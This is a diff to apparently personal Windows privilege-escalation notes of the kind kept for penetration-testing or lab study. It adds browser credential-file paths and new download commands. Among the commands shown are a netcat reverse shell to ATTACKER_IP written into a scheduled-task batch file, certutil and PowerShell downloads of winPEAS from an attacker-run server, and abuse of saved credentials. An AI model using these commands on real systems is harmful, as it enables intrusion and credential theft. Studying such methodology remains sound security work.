@@ -46,6 +46,12 @@ Other interesting files
 Saved credentials
 	cmd/ps: `cmdkey /list` no passwords, but can be used with `runas /savecred /user:admin cmd.exe`
 
+Credential files
+	Firefox
+		https://book.hacktricks.wiki/en/generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/browser-artifacts.html?highlight=firefox#firefox
+		`%userprofile%\AppData\Roaming\Mozilla\Firefox\Profiles\`
+	Chrome...
+
 Configuration files
 	find strings in logfiles
 		cmd/ps: `type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString`
@@ -62,7 +68,7 @@ Scheduled tasks
 	`schtasks /run /tn [taskname]` start task (if perms)
 
 Permissions and ownership
-	`icacls` [[icacls]]
+	`icacls .` [[icacls]]
 
 Getting text into text files at ps/cmd-prompt
 	cmd: `echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat`
@@ -193,8 +199,9 @@ Metasploit
 
 Tools
 	WinPEAS
+		start kali python http server `python3 -m http.server 8000`
 		 https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS exe, bat & ps1 versions
-		cmd: `certutil -urlcache -split -f http://10.18.21.236:8000/enum/winPEASany.exe C:\windows\temp\winpeas.exe`
+		cmd: `certutil -urlcache -split -f http://10.21.31.111:8000/enum/winPEASany.exe C:\windows\temp\winpeas.exe`
 		ps: `iwr "http://10.18.21.236:8000/enum/winPEASany.exe" -outfile "C:\windows\temp\winpeas.exe"`
 		`winpeas > log.txt`
 	PrivescCheck
